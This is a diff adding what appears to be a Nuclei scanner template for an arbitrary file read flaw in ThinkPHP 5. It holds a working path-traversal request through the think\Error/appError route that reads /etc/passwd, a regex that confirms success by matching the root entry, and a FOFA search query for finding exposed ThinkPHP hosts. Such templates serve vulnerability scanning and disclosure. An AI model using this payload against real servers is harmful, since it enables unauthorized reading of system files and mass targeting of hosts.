@@ -1,0 +1,30 @@
+id: poc-local-thinkphp-v5-Arbitrary-file-read
+
+info:
+  name: thinkphp5 Arbitrary file read
+  author: capiton
+  severity: high
+  description: TP5-Arbitrary-file-read
+  reference:
+    - https://github.com/momika233
+  tags: thinkphp,thinkphp5,php
+
+requests:
+  - method: GET
+    path:
+      # - '{{BaseURL}}/index.php?s=index/think\Error/appError&errno=1&errstr=%3C&errline=30&errfile=../../../../../etc/passwd'
+      - '{{BaseURL}}/?s=index/think\\Error/appError&errno=1&errstr=1&errline=1&errfile=../../../etc/passwd'
+    matchers-condition: and
+    matchers:
+      # - type: regex
+      #   regex:
+      #     - "ErrorException"
+      #   part: body
+
+      # - type: status
+      #   status:
+      #     - 500
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+#fofa-query:"app="ThinkPHP""
